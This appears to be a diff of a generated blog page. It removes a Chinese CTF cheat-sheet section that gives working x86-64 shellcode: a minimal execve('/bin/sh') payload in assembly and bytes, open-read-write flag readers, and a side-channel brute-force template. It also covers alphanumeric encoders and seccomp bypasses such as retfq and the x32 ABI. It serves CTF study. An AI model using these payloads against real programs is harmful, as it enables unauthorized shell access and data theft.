@@ -227,7 +227,7 @@
   <div class="archive syuanpi fadeInRightShort" id="archive">
     
       <aside class="archive-title">Total</aside>
-      <span class="archive-num">6 Posts In Total</span>
+      <span class="archive-num">7 Posts In Total</span>
     
       
       
@@ -250,171 +250,6 @@
 <li><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">shellcode database</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">exploit-db</a></li>
 </ul>
-<p>接下来给出几个尽可能短的shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; excve(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,0)</span><br><span class="line">; rax: 0x3b</span><br><span class="line">; rdi: &#x27;/bin/sh&#x27; </span><br><span class="line">; rsi: &#x27;sh&#x27; </span><br><span class="line">; rdx; NULL</span><br></pre></td></tr></table></figure>
-<h2 id="最短shellcode">最短shellcode</h2>
-<h3 id="特征与条件">特征与条件</h3>
-<p>长度为22字节<br>
-主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r/m64指令，实现清空rax和rdx</p>
-<ul>
-<li>eax 高二位必须为0，一般是满足的</li>
-</ul>
-<h3 id="汇编">汇编</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 	rsi, rsi</span><br><span class="line">push	rsi	</span><br><span class="line">mov 	rdi, 0x68732f2f6e69622f</span><br><span class="line">push	rdi</span><br><span class="line">push	rsp		</span><br><span class="line">pop	    rdi			</span><br><span class="line">mov 	al,	59	</span><br><span class="line">cdq				</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi	</span><br><span class="line">56	                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,	0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp		</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59	 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq 	   	 ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br></pre></td></tr></table></figure>
-<h3 id="字节码">字节码</h3>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// int</span><br><span class="line">0x622fbf4856f63148</span><br><span class="line">0x545768732f2f6e69</span><br><span class="line">0x050f993bb05f</span><br><span class="line"></span><br><span class="line">// bytes</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
-<h2 id="orw">orw</h2>
-<h3 id="特征与条件-2">特征与条件</h3>
-<p>长度为0x28字节<br>
-主要是通过异或实现了取代了mov减少长度</p>
-<ul>
-<li>rsp指向的地址必须是可用的</li>
-<li>存在NULL字符</li>
-</ul>
-<h3 id="汇编-2">汇编</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// rdx为写入数量</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi  #如果本来rsi=0，可以删掉这句</span><br><span class="line">mov eax,2</span><br><span class="line">syscall</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br><span class="line">xor edi,2  </span><br><span class="line">mov eax,edi</span><br><span class="line">syscall  </span><br></pre></td></tr></table></figure>
-<h3 id="字节码-2">字节码</h3>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6800000200c2c748</span><br><span class="line">0x31e7894867616c66</span><br><span class="line">0x050f00000002b8f6</span><br><span class="line">0x0fc031e68948c789</span><br><span class="line">0x050ff88902f78305</span><br><span class="line"></span><br><span class="line">\x48\xc7\xc2\x00\x02\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x83\xf7\x02\x89\xf8\x0f\x05</span><br></pre></td></tr></table></figure>
-<h3 id="可指定地址orw">可指定地址orw</h3>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dh, 0x2</span></span><br><span class="line"><span class="string">mov rdi,&#123;&#125;</span></span><br><span class="line"><span class="string">xor esi,esi  </span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rsi,rdi</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(target_addr + <span class="number">0xb0</span>))</span><br></pre></td></tr></table></figure>
-<h2 id="侧信道爆破">侧信道爆破</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code = asm(</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	xor edx, edx</span></span><br><span class="line"><span class="string">	xor esi, esi</span></span><br><span class="line"><span class="string">	push SYS_open</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	xor eax, eax</span></span><br><span class="line"><span class="string">	push 6</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	push 0x50</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	mov rsi, 0x10100</span></span><br><span class="line"><span class="string">	syscall </span></span><br><span class="line"><span class="string">	mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">	mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">	cmp cl, dl</span></span><br><span class="line"><span class="string">	jz loop</span></span><br><span class="line"><span class="string">	mov al,231</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	loop:</span></span><br><span class="line"><span class="string">	jmp loop</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>.<span class="built_in">format</span>(offset, ch)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<h1 id="字符限制">字符限制</h1>
-<h2 id="编码工具">编码工具</h2>
-<table>
-<thead>
-<tr>
-<th style="text-align:center"></th>
-<th style="text-align:center">ae64</th>
-<th><a target="_blank" rel="noopener" href="https://github.com/SkyLined/alpha3">alpha3</a></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">Encode x32 alphanumeric shellcode</td>
-<td style="text-align:center">x</td>
-<td>✔</td>
-</tr>
-<tr>
-<td style="text-align:center">Encode x64 alphanumeric shellcode</td>
-<td style="text-align:center">✔</td>
-<td>✔</td>
-</tr>
-<tr>
-<td style="text-align:center">Original shellcode can contain zero bytes</td>
-<td style="text-align:center">✔</td>
-<td>x</td>
-</tr>
-<tr>
-<td style="text-align:center">Base address register can contain offset</td>
-<td style="text-align:center">✔</td>
-<td>x</td>
-</tr>
-</tbody>
-</table>
-<h4 id="Alpha3">Alpha3</h4>
-<p>限制只能使用字母或者数字<br>
-alpha3使用:<br>
-alpha3需要python2环境，所以先安装python2</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x31\xc0\xb0\x3b\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(sc)</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin </span><br></pre></td></tr></table></figure>
-<p>可以选择架构、编码、限制的字符</p>
-<h3 id="AE64">AE64</h3>
-<p>AE64可以直接在python中导入，使用相对较为方便且限制较少</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure>
-<h2 id="手动绕过">手动绕过</h2>
-<p>主要是通过sub、add、xor等指令对于非字母数字指令进行加密。<br>
-可以先根据限制筛选出受限制后的指令列表，然后根据指令列表进行组合，从而实现绕过。</p>
-<p>另一种方法是通过shellcode先实现write读取到shellcode的位置，然后输入新的无限制的<br>
-shellcode来完成绕过。</p>
-<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">https://nets.ec/Alphanumeric_shellcode</a></p>
-<h1 id="特定位置字符限制">特定位置字符限制</h1>
-<p>在最近的*CTF中存在一个用浮点数输入字符，并对浮点数做限制写shellcode的题目，实际上是限制了每八位需要有两位是特定字符，这里给出两种绕过思路:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, im64</span><br><span class="line">mov rcx, im32</span><br><span class="line">mov ecx, im32</span><br><span class="line">mov cl, im16</span><br></pre></td></tr></table></figure>
-<p>这里im是可以由我们自由控制的立即数，因此我们可以通过插入这些无关指令填充来绕过限制，上面这些指令涵盖了3、4、5字节，可以灵活插入来达到需要的效果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short</span><br></pre></td></tr></table></figure>
-<p>通过jmp短跳转直接跳过中间指令，从而绕过限制</p>
-<p>jmp指令本身只有两个字节，更为灵活。</p>
-<h1 id="对于orw的限制">对于orw的限制</h1>
-<p>如果程序还对orw等系统调用作出了限制呢？<br>
-w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open，orw就  很难进行下去了。<br>
-但是还有一种方法。</p>
-<h2 id="利用32位调用绕过orw">利用32位调用绕过orw</h2>
-<p>x86与x64的syscall number是不一样的，如果能够跳转到32位执行相应的shellcode，就可一绕过限制。</p>
-<p><strong>x86</strong> <strong>sys_number</strong></p>
-<table>
-<thead>
-<tr>
-<th>sys_number</th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>3</td>
-<td>read</td>
-<td></td>
-<td>0x03</td>
-<td>unsigned int fd</td>
-<td>char *buf</td>
-<td>size_t count</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>4</td>
-<td>write</td>
-<td></td>
-<td>0x04</td>
-<td>unsigned int fd</td>
-<td>const char *buf</td>
-<td>size_t count</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>5</td>
-<td>open</td>
-<td></td>
-<td>0x05</td>
-<td>const char *filename</td>
-<td>int flags</td>
-<td>umode_t mode</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<p>而程序是由32位还是64位执行是由cs寄存器决定的，而retfq指令可以对其作出更改，从而切换寄存器状态，所以可以由此实现orw。</p>
-<h2 id="x32-ABI">x32 ABI</h2>
-<p>x32 ABI 是一个应用程序二进制接口 (ABI)，也是 Linux 内核的接口之一。 x32 ABI 在 Intel 和 AMD 64 位硬件上提供 32 位整数、长整数和指针。</p>
-<p>可以通过 查看内核源代码 unistd_x32.h 查看</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/src/kernels/6.4.7-200.fc38.x86_64/arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UAPI_ASM_UNISTD_X32_H              </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UAPI_ASM_UNISTD_X32_H                </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)           </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)                                 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)  </span></span><br></pre></td></tr></table></figure>
-<p>即可以通过0x40000000+syscall_number 来调用一些系统调用。所以可以绕过对syscall的限制。</p>
-<p>不过这个特性似乎在大多数发行版中不受支持。</p>
-<h2 id="io-uring">io_uring</h2>
-<p>可以通过io_uring绕过对open限制的</p>
-<h2 id="mmap">mmap</h2>
-<p>似乎mmap可以把文件映射到虚拟内存，绕过对open的限制。</p>
-<h1 id="tricks">tricks</h1>
-<ul>
-<li>对于一些题目，对shellcode的检查用到了strlen，那么可以通过先使用一些存在NULL截断的指令，从而使得后面的字符串绕过限制。</li>
-<li>在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址</li>
-</ul>
-
             
           </div>
           <div class="archive-post-info">
@@ -568,6 +403,13 @@ w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open�
           </a>
         </div>
       
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approach/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
     </div>
   
     <div class="tagcloud-postlist ">
@@ -580,6 +422,13 @@ w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open�
           </a>
         </div>
       
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approach/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
     </div>
   
     <div class="tagcloud-postlist ">
@@ -587,6 +436,13 @@ w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open�
       
         <div class="tagcloud-post">
           <a href="/Linux.io_uring-Top-down-Approch/">
+            <time class="tagcloud-posttime">2023 / 12 / 04</time>
+            <span>Linux.io_uring-Top-down-Approch</span>
+          </a>
+        </div>
+      
+        <div class="tagcloud-post">
+          <a href="/Linux.io_uring-Top-down-Approach/">
             <time class="tagcloud-posttime">2023 / 12 / 04</time>
             <span>Linux.io_uring-Top-down-Approch</span>
           </a>
